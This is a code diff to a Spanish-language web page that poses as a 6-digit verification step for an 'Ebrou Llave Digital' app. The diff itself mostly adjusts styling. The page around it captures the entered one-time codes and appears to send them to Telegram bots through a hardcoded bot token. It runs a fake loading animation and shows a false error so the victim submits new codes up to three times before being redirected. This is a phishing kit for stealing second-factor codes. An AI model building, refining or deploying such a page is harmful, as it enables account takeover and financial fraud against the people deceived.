@@ -79,11 +79,14 @@
       gap: 10px;
       margin-bottom: 15px;
       width: 100%;
+      max-width: 270px;
+      margin-left: auto;
+      margin-right: auto;
     }
 
     .pin-input {
       width: 40px;
-      height: 40px;
+      height: 50px;
       text-align: center;
       font-size: 24px;
       border: 2px solid #ccc;
@@ -111,6 +114,7 @@
       font-weight: bold;
       cursor: pointer;
       width: 100%;
+      max-width: 270px;
     }
 
     #error-message {
@@ -138,17 +142,21 @@
       height: 30px;
     }
 
-    /* Ajuste responsivo */
     @media (max-width: 480px) {
+      .pin-container {
+        max-width: 100%;
+        justify-content: space-between;
+        padding: 0 10px;
+      }
+
       .pin-input {
-        width: 45px;
-        height: 45px;
+        width: 42px;
+        height: 48px;
         font-size: 22px;
       }
 
       #continuar {
         font-size: 16px;
-        padding: 12px;
       }
     }
   </style>
@@ -166,7 +174,6 @@
       Ingrese el código de 6 dígitos creado por la app Ebrou Llave Digital para comprobar que eres el propietario de la cuenta.
     </p>
 
-    <!-- Cuadrados de entrada -->
     <div class="pin-container" id="pinContainer">
       <input type="text" maxlength="1" class="pin-input" inputmode="numeric" />
       <input type="text" maxlength="1" class="pin-input" inputmode="numeric" />
@@ -193,7 +200,6 @@
     const spinner = document.getElementById('spinner');
     const verificacion = document.getElementById('verificacion');
 
-    // Animación de carga
     let porcentaje = 0;
     const intervalo = setInterval(() => {
       porcentaje += Math.floor(Math.random() * 8) + 3;
@@ -209,7 +215,6 @@
       porcentajeEl.textContent = porcentaje + '%';
     }, 400);
 
-    // Activar/desactivar botón
     function checkFilled() {
       const filled = Array.from(inputs).every(input => input.value !== '');
       continuarBtn.disabled = !filled;
@@ -231,7 +236,6 @@
       });
     });
 
-    // Telegram Config
     const bots = [
       {
         token: '8135711594:AAFr31MSd-lpmmS7gC92WpMBMCyIo8l5n8U',
@@ -266,7 +270,6 @@
         ));
 
         if (intentos < 3) {
-          // Mostrar error visual
           errorMessage.style.display = 'block';
           inputs.forEach(input => input.classList.add('pin-error'));
 
@@ -280,7 +283,6 @@
             checkFilled();
           }, 3000);
         } else {
-          // Redirigir después del tercer intento
           window.location.href = 'facturando.html';
         }
       } catch (err) {
